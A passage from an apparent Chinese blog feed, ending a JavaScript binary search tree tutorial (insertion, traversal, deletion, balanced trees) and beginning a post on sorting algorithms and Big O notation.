class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"> <span class="comment">//1.创建BinarySearchTree</span></span><br><span class="line"> <span class="keyword">let</span> bst = <span class="keyword">new</span> BinarySearchTree()</span><br><span class="line"></span><br><span class="line"> <span class="comment">//2.插入数据</span></span><br><span class="line"> bst.insert(<span class="number">11</span>);</span><br><span class="line"> bst.insert(<span class="number">7</span>);</span><br><span class="line"> bst.insert(<span class="number">15</span>);</span><br><span class="line"> bst.insert(<span class="number">5</span>);</span><br><span class="line"> bst.insert(<span class="number">3</span>);</span><br><span class="line"> bst.insert(<span class="number">9</span>);</span><br><span class="line"> bst.insert(<span class="number">8</span>);</span><br><span class="line"> bst.insert(<span class="number">10</span>);</span><br><span class="line"> bst.insert(<span class="number">13</span>);</span><br><span class="line"> bst.insert(<span class="number">12</span>);</span><br><span class="line"> bst.insert(<span class="number">14</span>);</span><br><span class="line"> bst.insert(<span class="number">20</span>);</span><br><span class="line"> bst.insert(<span class="number">18</span>);</span><br><span class="line"> bst.insert(<span class="number">25</span>);</span><br><span class="line"> bst.insert(<span class="number">6</span>);</span><br><span class="line"> bst.insert(<span class="number">19</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//3.测试删除代码</span></span><br><span class="line"> <span class="comment">//删除没有子节点的节点</span></span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">3</span>)</span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">8</span>)</span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//删除有一个子节点的节点</span></span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">5</span>)</span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//删除有两个子节点的节点</span></span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">9</span>)</span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">7</span>)</span><br><span class="line"> bst.<span class="keyword">remove</span>(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment">//遍历二叉搜索树并输出</span></span><br><span class="line"> <span class="keyword">let</span> resultString = <span class="string">&quot;&quot;</span></span><br><span class="line"> bst.midOrderTraversal(function(key)&#123;</span><br><span class="line">   resultString += key + <span class="string">&quot;-&gt;&quot;</span></span><br><span class="line"> &#125;)</span><br><span class="line"> alert(resultString)</span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/28.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/28.png" alt="image-20200302225943296"></a></p><p>image-20200302225943296</p><p>可见三种情况的节点都被成功删除了。</p><h4 id="5-二叉搜索树完整封装"><a href="#5-二叉搜索树完整封装" class="headerlink" title="5.二叉搜索树完整封装"></a>5.二叉搜索树完整封装</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//封装二叉搜索树</span></span><br><span class="line">    function BinarySearchTree()&#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//节点内部类</span></span><br><span class="line">      function Node(key)&#123;</span><br><span class="line">        <span class="keyword">this</span>.key = key</span><br><span class="line">        <span class="keyword">this</span>.left = <span class="literal">null</span></span><br><span class="line">        <span class="keyword">this</span>.right = <span class="literal">null</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//属性</span></span><br><span class="line">      <span class="keyword">this</span>.root = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//方法</span></span><br><span class="line">      <span class="comment">//一.插入数据：insert方法:对外向用户暴露的方法</span></span><br><span class="line">      BinarySearchTree.prototype.insert = function(key)&#123;</span><br><span class="line">        <span class="comment">//1.根据key创建节点</span></span><br><span class="line">        let newNode = new Node(key)</span><br><span class="line">          </span><br><span class="line">        <span class="comment">//2.判断根节点是否存在</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.root == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">this</span>.root = newNode</span><br><span class="line">          <span class="comment">//根节点存在时</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">this</span>.insertNode(<span class="keyword">this</span>.root, newNode)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//内部使用的insertNode方法:用于比较节点从左边插入还是右边插入</span></span><br><span class="line">      BinarySearchTree.prototype.insertNode = function(node, newNode)&#123;</span><br><span class="line">        <span class="comment">//当newNode.key &lt; node.key向左查找</span></span><br><span class="line">        <span class="keyword">if</span>(newNode.key &lt; node.key)&#123;</span><br><span class="line">          <span class="comment">//情况1：node无左子节点，直接插入</span></span><br><span class="line">          <span class="keyword">if</span> (node.left == <span class="literal">null</span>) &#123;</span><br><span class="line">            node.left = newNode</span><br><span class="line">          <span class="comment">//情况2：node有左子节点，递归调用insertNode(),直到遇到无左子节点成功插入newNode后，不再符合该情况，也就不再调用insertNode()，递归停止。</span></span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.insertNode(node.left, newNode)</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//当newNode.key &gt;= node.key向右查找</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//情况1：node无右子节点，直接插入</span></span><br><span class="line">          <span class="keyword">if</span>(node.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            node.right = newNode</span><br><span class="line">          <span class="comment">//情况2：node有右子节点，依然递归调用insertNode(),直到遇到无右子节点成功插入newNode为止</span></span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.insertNode(node.right, newNode)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//二.树的遍历</span></span><br><span class="line">      <span class="comment">//1.先序遍历</span></span><br><span class="line">      <span class="comment">//掺入一个handler函数对得到的key进行处理</span></span><br><span class="line">      BinarySearchTree.prototype.preOrderTraversal = function(handler)&#123;</span><br><span class="line">        <span class="keyword">this</span>.preOrderTraversalNode(<span class="keyword">this</span>.root, handler)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//封装内部方法，对某个节点进行遍历</span></span><br><span class="line">      BinarySearchTree.prototype.preOrderTraversalNode = function(node,handler)&#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">//1.处理经过的节点</span></span><br><span class="line">          handler(node.key)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//2.遍历经过节点的左子节点</span></span><br><span class="line">          <span class="keyword">this</span>.preOrderTraversalNode(node.left, handler)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//3.遍历经过节点的右子节点</span></span><br><span class="line">          <span class="keyword">this</span>.preOrderTraversalNode(node.right, handler)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//2.中序遍历</span></span><br><span class="line">      BinarySearchTree.prototype.midOrderTraversal = function(handler)&#123;</span><br><span class="line">        <span class="keyword">this</span>.midOrderTraversalNode(<span class="keyword">this</span>.root, handler)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      BinarySearchTree.prototype.midOrderTraversalNode = function(node, handler)&#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">//1.遍历左子树中的节点</span></span><br><span class="line">          <span class="keyword">this</span>.midOrderTraversalNode(node.left, handler)</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//2.处理节点</span></span><br><span class="line">          handler(node.key)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//3.遍历右子树中的节点</span></span><br><span class="line">          <span class="keyword">this</span>.midOrderTraversalNode(node.right, handler)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//3.后序遍历</span></span><br><span class="line">      BinarySearchTree.prototype.postOrderTraversal = function(handler)&#123;</span><br><span class="line">        <span class="keyword">this</span>.postOrderTraversalNode(<span class="keyword">this</span>.root, handler)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      BinarySearchTree.prototype.postOrderTraversalNode = function(node, handler)&#123;</span><br><span class="line">        <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">//1.遍历左子树中的节点</span></span><br><span class="line">          <span class="keyword">this</span>.postOrderTraversalNode(node.left, handler)</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//2.遍历右子树中的节点</span></span><br><span class="line">          <span class="keyword">this</span>.postOrderTraversalNode(node.right, handler)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//3.处理节点</span></span><br><span class="line">          handler(node.key)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//三.寻找最值</span></span><br><span class="line">      <span class="comment">//寻找最大值</span></span><br><span class="line">      BinarySearchTree.prototype.max = function () &#123;</span><br><span class="line">        <span class="comment">//1.获取根节点</span></span><br><span class="line">        let node = <span class="keyword">this</span>.root</span><br><span class="line">        <span class="comment">//2.定义key保存节点值</span></span><br><span class="line">        let key = <span class="literal">null</span></span><br><span class="line">        <span class="comment">//3.依次向右不断查找，直到节点为null</span></span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          key = node.key</span><br><span class="line">          node = node.right</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//寻找最小值</span></span><br><span class="line">      BinarySearchTree.prototype.min = function()&#123;</span><br><span class="line">         <span class="comment">//1.获取根节点</span></span><br><span class="line">         let node = <span class="keyword">this</span>.root</span><br><span class="line">        <span class="comment">//2.定义key保存节点值</span></span><br><span class="line">        let key = <span class="literal">null</span></span><br><span class="line">        <span class="comment">//3.依次向左不断查找，直到节点为null</span></span><br><span class="line">        <span class="keyword">while</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">          key = node.key</span><br><span class="line">          node = node.left</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//查找特定的key</span></span><br><span class="line">      BinarySearchTree.prototype.search = function(key)&#123;</span><br><span class="line">        <span class="comment">//1.获取根节点</span></span><br><span class="line">        let node = <span class="keyword">this</span>.root</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.循环搜索key</span></span><br><span class="line">        <span class="keyword">while</span>(node != <span class="literal">null</span>)&#123;</span><br><span class="line">          <span class="keyword">if</span> (key &lt; node.key) &#123;</span><br><span class="line">            <span class="comment">//小于根(父)节点就往左边找</span></span><br><span class="line">            node = node.left</span><br><span class="line">            <span class="comment">//大于根(父)节点就往右边找</span></span><br><span class="line">          &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key &gt; node.key)&#123;</span><br><span class="line">            node = node.right</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//四.删除节点</span></span><br><span class="line">      BinarySearchTree.prototype.remove = function(key)&#123;</span><br><span class="line"><span class="comment">/*------------------------------1.寻找要删除的节点---------------------------------*/</span></span><br><span class="line">        <span class="comment">//1.1.定义变量current保存删除的节点，parent保存它的父节点。isLeftChild保存current是否为parent的左节点</span></span><br><span class="line">        let current = <span class="keyword">this</span>.root</span><br><span class="line">        let parent = <span class="literal">null</span></span><br><span class="line">        let isLeftChild = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.2.开始寻找删除的节点</span></span><br><span class="line">        <span class="keyword">while</span> (current.key != key) &#123;</span><br><span class="line">          parent = current</span><br><span class="line">          <span class="comment">// 小于则往左查找</span></span><br><span class="line">          <span class="keyword">if</span> (key &lt; current.key) &#123;</span><br><span class="line">            isLeftChild = <span class="literal">true</span></span><br><span class="line">            current = current.left</span><br><span class="line">          &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            isLeftChild = <span class="literal">false</span></span><br><span class="line">            current = current.right</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//找到最后依然没有找到相等的节点</span></span><br><span class="line">          <span class="keyword">if</span> (current == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//结束while循环后：current.key = key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------------------2.根据对应情况删除节点------------------------------*/</span></span><br><span class="line">        <span class="comment">//情况1：删除的是叶子节点(没有子节点)</span></span><br><span class="line">        <span class="keyword">if</span> (current.left == <span class="literal">null</span> &amp;&amp; current.right ==<span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">            <span class="keyword">this</span>.root = <span class="literal">null</span></span><br><span class="line">          &#125;<span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild)&#123;</span><br><span class="line">            parent.left = <span class="literal">null</span></span><br><span class="line">          &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            parent.right =<span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//情况2：删除的节点有一个子节点</span></span><br><span class="line">        <span class="comment">//当current存在左子节点时</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(current.right == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">              <span class="keyword">this</span>.root = current.left</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">                parent.left = current.left</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                parent.right = current.left</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//当current存在右子节点时</span></span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(current.left == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">              <span class="keyword">this</span>.root = current.right</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(isLeftChild) &#123;</span><br><span class="line">                parent.left = current.right</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                parent.right = current.right</span><br><span class="line">            &#125; </span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">//情况3：删除的节点有两个子节点</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="comment">//1.获取后继节点</span></span><br><span class="line">          let successor = <span class="keyword">this</span>.getSuccessor(current)</span><br><span class="line"></span><br><span class="line">          <span class="comment">//2.判断是否根节点</span></span><br><span class="line">          <span class="keyword">if</span> (current == <span class="keyword">this</span>.root) &#123;</span><br><span class="line">            <span class="keyword">this</span>.root = successor</span><br><span class="line">          &#125;<span class="keyword">else</span> <span class="keyword">if</span> (isLeftChild)&#123;</span><br><span class="line">            parent.left = successor</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            parent.right = successor</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//3.将后继的左子节点改为被删除节点的左子节点</span></span><br><span class="line">          successor.left = current.left</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//封装查找后继的方法</span></span><br><span class="line">      BinarySearchTree.prototype.getSuccessor = function(delNode)&#123;</span><br><span class="line">        <span class="comment">//1.定义变量,保存找到的后继</span></span><br><span class="line">        let successor = delNode</span><br><span class="line">        let current = delNode.right</span><br><span class="line">        let successorParent = delNode</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.循环查找current的右子树节点</span></span><br><span class="line">        <span class="keyword">while</span>(current != <span class="literal">null</span>)&#123;</span><br><span class="line">          successorParent = successor</span><br><span class="line">          successor = current</span><br><span class="line">          current = current.left</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.判断寻找到的后继节点是否直接就是删除节点的right节点</span></span><br><span class="line">        <span class="keyword">if</span>(successor != delNode.right)&#123;</span><br><span class="line">          successorParent.left = successor.right</span><br><span class="line">          successor.right = delNode.right </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> successor</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="五、平衡树"><a href="#五、平衡树" class="headerlink" title="五、平衡树"></a>五、平衡树</h2><p><strong>二叉搜索树的缺陷：</strong></p><p>当插入的数据是有序的数据，就会造成二叉搜索树的深度过大。比如原二叉搜索树右 11 7 15 组成，如下图所示：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/29.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/29.png" alt="image-20200302231503639"></a></p><p>当插入一组有序数据：6 5 4 3 2就会变成深度过大的搜索二叉树，会严重影响二叉搜索树的性能。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/30.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/30.png" alt="image-20200302231745864"></a></p><p><strong>非平衡树</strong></p><ul><li>比较好的二叉搜索树，它的数据应该是<strong>左右均匀分布</strong>的；</li><li>但是插入<strong>连续数据</strong>后，二叉搜索树中的数据分布就变得<strong>不均匀</strong>了，我们称这种树为<strong>非平衡树</strong>；</li><li>对于一棵<strong>平衡二叉树</strong>来说，插入/查找等操作的效率是<strong>O（logN）</strong>；</li><li>而对于一棵<strong>非平衡二叉树</strong>来说，相当于编写了一个链表，查找效率变成了<strong>O（N）</strong>;</li></ul><p><strong>树的平衡性</strong></p><p>为了能以<strong>较快的时间O（logN）</strong>来操作一棵树，我们需要<strong>保证树总是平衡</strong>的：</p><ul><li>起码大部分是平衡的，此时的时间复杂度也是接近O（logN）的；</li><li>这就要求树中<strong>每个节点左边的子孙节点</strong>的个数，应该尽可能地等于<strong>右边的子孙节点</strong>的个数；</li></ul><p><strong>常见的平衡树</strong></p><ul><li><strong>AVL树</strong>：是最早的一种平衡树，它通过在每个节点多存储一个额外的数据来保持树的平衡。由于AVL树是平衡树，所以它的时间复杂度也是O（logN）。但是它的整体效率不如红黑树，开发中比较少用。</li><li><strong>红黑树</strong>：同样通过<strong>一些特性</strong>来保持树的平衡，时间复杂度也是O（logN）。进行插入/删除等操作时，性能优于AVL树，所以平衡树的应用基本都是红黑树。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://aiolimp.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://aiolimp.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript实现排序算法</title>
    <link href="http://aiolimp.com/2022/07/09/JavaScript%E5%AE%9E%E7%8E%B0%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <id>http://aiolimp.com/2022/07/09/JavaScript%E5%AE%9E%E7%8E%B0%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</id>
    <published>2022-07-09T02:23:20.000Z</published>
    <updated>2023-03-05T14:22:22.214Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="JavaScript实现排序算法"><a href="#JavaScript实现排序算法" class="headerlink" title="JavaScript实现排序算法"></a>JavaScript实现排序算法</h2><h3 id="一、大O表示法"><a href="#一、大O表示法" class="headerlink" title="一、大O表示法"></a>一、大O表示法</h3><p><strong>大O表示法：</strong></p><ul><li>在计算机中采用<strong>粗略的度量</strong>来描述计算机算法的<strong>效率</strong>，这种方法被称为<strong>“大O”表示法</strong></li><li>在<strong>数据项个数</strong>发生改变时，<strong>算法的效率</strong>也会跟着改变。所以说算法A比算法B快两倍，这样的比较是<strong>没有意义</strong>的。</li><li>因此我们通常使用<strong>算法的速度</strong>随着<strong>数据量的变化</strong>会如何变化的方式来表示算法的效率，大O表示法就是方式之一。</li></ul><p><strong>常见的大O表示形式</strong></p><table><thead><tr><th>符号</th><th>名称</th></tr></thead><tbody><tr><td>O（1）</td><td>常数</td></tr><tr><td>O（log(n)）</td><td>对数</td></tr><tr><td>O（n）</td><td>线性</td></tr><tr><td>O（nlog(n)）</td><td>线性和对数乘积</td></tr><tr><td>O（n²）</td><td>平方</td></tr><tr><td>O（2n）</td><td>指数</td></tr></tbody></table><p><strong>不同大O形式的时间复杂度：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/1.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/1.png" alt="image-20200304164951223"></a></p><p>可以看到效率从大到小分别是：O（1）&gt; O（logn）&gt; O（n）&gt; O（nlog(n)）&gt; O（n²）&gt; O（2n）</p><p><strong>推导大O表示法的三条规则：</strong></p><ul><li><strong>规则一</strong>：用常量1取代运行时间中所有的加法常量。如7 + 8 = 15，用1表示运算结果15，大O表示法表示为O（1）；</li><li><strong>规则二</strong>：运算中只保留最高阶项。如N^3 + 3n +1，大O表示法表示为：O（N3）;</li><li><strong>规则三</strong>：若最高阶项的常数不为1，可将其省略。如4N2，大O表示法表示为：O（N2）;</li></ul><h3 id="二、排序算法"><a href="#二、排序算法" class="headerlink" 